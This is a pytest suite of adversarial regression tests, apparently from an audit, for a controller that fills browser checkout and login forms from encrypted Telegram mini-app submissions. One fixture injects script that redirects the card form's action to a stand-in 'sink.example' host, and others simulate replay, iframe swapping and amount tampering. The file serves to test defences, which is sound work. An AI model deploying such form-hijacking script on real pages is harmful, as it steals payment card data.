"""Adversarial regressions from the independent e33b50b audit.

All browser traffic is intercepted; no live CDP profile or accounts are used.
"""
import asyncio
import base64
import json
import os
from types import SimpleNamespace as NS

import pytest
import pytest_asyncio
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from playwright.async_api import async_playwright
from telegram.ext import ApplicationHandlerStop

from plugin.secure_handoff import SecureHandoffController, Session, make_request, decrypt_submission


class Ctx:
    def get_config(self, name):
        return {"allowed_user_ids": [7], "mini_app_url": "https://mini.example/app",
                "browser_cdp_url": "http://127.0.0.1:9222"}[name]


class Bot:
    def __init__(self):
        self.sent = []

    async def send_message(self, **kwargs):
        self.sent.append(kwargs)
        return NS(message_id=len(self.sent))


def encrypted(request, key, body):
    aes, iv = os.urandom(32), os.urandom(12)
    b64 = lambda value: base64.urlsafe_b64encode(value).decode().rstrip("=")
    plaintext = body if isinstance(body, bytes) else json.dumps(body).encode()
    return json.dumps({"v": 3, "id": request["id"], "wrappedKey": b64(key.public_key().encrypt(
        aes, padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))),
        "iv": b64(iv), "ciphertext": b64(AESGCM(aes).encrypt(iv, plaintext, request["id"].encode()))})


async def submit(controller, raw):
    update = NS(effective_user=NS(id=7), effective_chat=NS(id=7, type="private"),
                effective_message=NS(message_thread_id=None, web_app_data=NS(data=raw)))
    with pytest.raises(ApplicationHandlerStop):
        await controller._web_data(update, NS(bot=controller.bot))


CHECKOUT = '''<main><form id="checkout" action="/purchase">
<label>Card number<input id="card" autocomplete="cc-number"></label>
<label>Security code<input id="cvc" autocomplete="cc-csc"></label>
<button id="buy" type="button" onclick="window.clicks=(window.clicks||0)+1">Buy</button>
</form><p id="amount">USD 1</p></main>'''


@pytest_asyncio.fixture
async def fixture():
    async with async_playwright() as pw:
        browser = await pw.chromium.launch(channel=os.environ.get("PLAYWRIGHT_CHANNEL", "chromium"))
        context = await browser.new_context()
        await context.route("**/*", lambda route: route.fulfill(content_type="text/html", body="<html></html>"))
        controllers = []
        async def create(html):
            page = await context.new_page()
            await page.goto("https://merchant.example/start")
            await page.set_content(html)
            controller = SecureHandoffController(Ctx(), browser=browser, context=context)
            controller.bot = Bot()
            session = Session(7, 7, None, page=page, context=context, wake=asyncio.Event())
            controller.sessions[(7, 7, None)] = session
            controllers.append(controller)
            return controller, session, page
        try:
            yield create
        finally:
            for controller in controllers:
                for identity in list(controller.sessions):
                    await controller._close(identity)
            await browser.close()


@pytest.mark.asyncio
@pytest.mark.parametrize('field', [
    '<input name="confirm" type="password" autocomplete="current-password">',
    '<input name="profile" autocomplete="username">',
])
@pytest.mark.parametrize('action', ['Submit', 'Continue', 'Next'])
async def test_auth_autocomplete_alone_does_not_authorize_ambiguous_actions(fixture, field, action):
    controller, session, page = await fixture(
        '<form onsubmit="event.preventDefault();window.changed=1">' + field +
        f'<button type="submit">{action}</button></form>')
    result = await controller._snapshot(session)
    if result['status'] == 'waiting_for_handoff':
        assert session.request['mode'] == 'form'
        field_id = session.request['fields'][0]['id']
        await submit(controller, encrypted(session.request, session.key, {'values': {field_id: 'SYNTHETIC'}}))
    assert not await page.evaluate('window.changed || 0')


@pytest.mark.asyncio
async def test_one_field_purchase_never_falls_back_to_auth_click(fixture):
    controller, session, page = await fixture('<form action="/purchase"><input name="username">'
        '<button type="submit">Buy</button></form><script>document.querySelector("form").onsubmit=e=>'
        '{e.preventDefault();window.clicked=true;}</script>')
    await controller._snapshot(session)
    if session.request:
        raw = encrypted(session.request, session.key, {"values": {"f0": "SYNTHETIC-USER"}})
        await submit(controller, raw)
    assert await page.evaluate("window.clicked === true") is False
    assert not session.request or session.request["mode"] != "auth"


@pytest.mark.asyncio
async def test_ordinary_calls_never_expose_echo_or_mutate_unbound_forms(fixture):
    controller, session, page = await fixture('<form><input type="password" readonly>'
        '<button>SYNTHETIC-SECRET-ECHO</button></form><input id="otp" autocomplete="one-time-code">')
    result = await controller._snapshot(session)
    assert "SYNTHETIC-SECRET-ECHO" not in json.dumps(result)
    await controller._ordinary(session, "type", {"ref": "rtest", "text": "SYNTHETIC-OTP"})
    assert await page.locator("#otp").input_value() == ""


@pytest.mark.asyncio
async def test_old_request_cannot_fill_new_same_origin_document(fixture):
    controller, session, page = await fixture(CHECKOUT)
    await controller._snapshot(session)
    raw = encrypted(session.request, session.key, {"values": {"f0": "SYNTHETIC-CARD", "f1": "SYNTHETIC-CVC"}})
    await page.goto("https://merchant.example/replacement")
    await page.set_content(CHECKOUT)
    await submit(controller, raw)
    assert await page.locator("#card").input_value() == ""
    assert session.status == "rejected"


@pytest.mark.asyncio
async def test_replacement_iframe_cannot_inherit_request_authority(fixture):
    controller, session, page = await fixture('<main><iframe src="https://processor.example/fields"></iframe>'
        '<button type="button">Pay</button></main>')
    frame = page.frames[-1]
    await frame.wait_for_load_state()
    await frame.set_content('<input autocomplete="cc-number">')
    first = await controller._snapshot(session)
    assert first['status'] == 'waiting_for_handoff'
    old_request = session.request
    old_key = session.key
    raw = encrypted(old_request, old_key, {'values': {'f0': 'SYNTHETIC-CARD'}})
    await frame.goto('https://other-processor.example/fields')
    await frame.set_content('<input autocomplete="cc-number">')
    await submit(controller, raw)
    assert session.status == 'rejected'
    assert await frame.locator('input').input_value() == ''


@pytest.mark.asyncio
async def test_input_action_mutation_blocks_later_fields(fixture):
    controller, session, page = await fixture(CHECKOUT + '<script>document.querySelector("#card").oninput=()=>'
        '{document.querySelector("form").action="https://sink.example/receive";};</script>')
    await controller._snapshot(session)
    raw = encrypted(session.request, session.key, {"values": {"f0": "SYNTHETIC-CARD", "f1": "SYNTHETIC-CVC"}})
    await submit(controller, raw)
    assert await page.locator("#cvc").input_value() == ""
    assert session.status == "rejected"


@pytest.mark.asyncio
async def test_no_purchase_execution_without_bound_visible_transaction_summary(fixture):
    controller, session, page = await fixture(CHECKOUT)
    await controller._snapshot(session)
    raw = encrypted(session.request, session.key, {"values": {"f0": "SYNTHETIC-CARD", "f1": "SYNTHETIC-CVC"}})
    await submit(controller, raw)
    if session.request and session.key:
        raw = encrypted(session.request, session.key, {"confirm": True})
        await page.locator("#amount").evaluate('e=>e.textContent="USD 9999"')
        await submit(controller, raw)
    assert await page.evaluate("window.clicks || 0") == 0


@pytest.mark.asyncio
async def test_close_during_apply_prevents_orphaned_fill(fixture):
    controller, session, page = await fixture(CHECKOUT)
    await controller._snapshot(session)
    raw = encrypted(session.request, session.key, {"values": {"f0": "SYNTHETIC-CARD", "f1": "SYNTHETIC-CVC"}})
    entered, release = asyncio.Event(), asyncio.Event()
    original = controller._fill_bound_field
    async def blocked(*args):
        entered.set()
        await release.wait()
        await original(*args)
    controller._fill_bound_field = blocked
    applying = asyncio.create_task(submit(controller, raw))
    await asyncio.wait_for(entered.wait(), 3)
    closing = asyncio.create_task(controller._close((7, 7, None)))
    await asyncio.sleep(0)
    release.set()
    await asyncio.wait_for(asyncio.gather(closing, applying), 5)
    assert await page.locator("#card").input_value() == ""
    assert await page.locator("#cvc").input_value() == ""
    assert (7, 7, None) not in controller.sessions
    assert session.status == "cancelled"


def test_group_tool_entry_never_dispatches():
    controller = SecureHandoffController(Ctx())
    controller._identity = lambda: (7, -100123, None)
    dispatched = []
    def capture(coro):
        coro.close()
        dispatched.append(True)
        return {"status": "dispatched"}
    controller._submit = capture
    result = json.loads(controller.tool({"action": "read"}))
    assert result["status"] == "rejected"
    assert not dispatched


@pytest.mark.parametrize("body", [b'{"confirm":false,"confirm":true}', b'{"confirm":true,"x":NaN}'])
def test_ambiguous_confirmation_plaintext_is_rejected(body):
    request, key = make_request("https://merchant.example", [], mode="payment_confirmation")
    with pytest.raises(ValueError):
        decrypt_submission(encrypted(request, key, body), request, key)


def test_select_rejects_unpublished_option():
    request, key = make_request("https://merchant.example", [{"id": "f0", "label": "Choice", "type": "select",
        "required": True, "options": [{"value": "approved", "label": "Approved"}]}], mode="checkout")
    with pytest.raises(ValueError):
        decrypt_submission(encrypted(request, key, {"values": {"f0": "not-published"}}), request, key)
